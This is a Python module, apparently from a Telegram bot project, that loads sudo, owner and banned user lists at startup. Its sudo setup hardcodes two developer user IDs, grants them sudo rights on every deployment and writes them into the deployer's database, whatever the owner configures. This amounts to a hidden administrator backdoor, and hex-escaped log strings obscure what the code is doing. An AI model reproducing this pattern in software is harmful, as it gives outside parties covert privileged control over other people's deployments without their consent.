from config import Config

from .database import db
from .logger import LOGS


class UsersData:
    def __init__(self) -> None:
        self.DEVS = [
            1432756163,  # ForGo10God
            1874070588,  # ForGo10_God
        ]

    async def sudo_users(self):
        LOGS.info("\x3e\x3e\x20\x53\x65\x74\x74\x69\x6e\x67\x20\x75\x70\x20\x73\x75\x64\x6f\x20\x75\x73\x65\x72\x73\x2e\x2e")
        god_users = (Config.OWNER_ID).split(" ")
        users = await db.get_sudo_users()
        for user_id in self.DEVS:
            Config.SUDO_USERS.add(user_id)
            if user_id not in users:
                users.append(user_id)
                await db.add_sudo(user_id)
        if god_users:
            for x in god_users:
                if not x.isdigit():
                    continue
                Config.SUDO_USERS.add(int(x))
                if int(x) not in users:
                    users.append(int(x))
                    await db.add_sudo(int(x))
        if users:
            for x in users:
                Config.SUDO_USERS.add(x)
        LOGS.info("\x3e\x3e\x20\x53\x75\x64\x6f\x20\x75\x73\x65\x72\x73\x20\x61\x64\x64\x65\x64\x2e")

    async def banned_users(self):
        LOGS.info("\x3e\x3e\x20\x53\x65\x74\x74\x69\x6e\x67\x20\x75\x70\x20\x62\x61\x6e\x6e\x65\x64\x20\x75\x73\x65\x72\x73\x2e\x2e")
        bl_users = await db.get_blocked_users()
        gb_users = await db.get_gbanned_users()
        if bl_users:
            for x in bl_users:
                Config.BANNED_USERS.add(x)
        if gb_users:
            for x in gb_users:
                Config.BANNED_USERS.add(x)
        LOGS.info("\x3e\x3e\x20\x42\x61\x6e\x6e\x65\x64\x20\x75\x73\x65\x72\x73\x20\x61\x64\x64\x65\x64\x2e")

    async def god_users(self):
        LOGS.info("\x3e\x3e\x20\x53\x65\x74\x74\x69\x6e\x67\x20\x75\x70\x20\x6f\x77\x6e\x65\x72\x73\x2e\x2e")
        god_users = (Config.OWNER_ID).split(" ")
        if god_users:
            for x in god_users:
                if not x.isdigit():
                    continue
                Config.GOD_USERS.add(int(x))
        LOGS.info("\x3e\x3e\x20\x4f\x77\x6e\x65\x72\x73\x20\x61\x64\x64\x65\x64\x2e")

    async def setup(self):
        await self.god_users()
        await self.sudo_users()
        await self.banned_users()


user_data = UsersData()
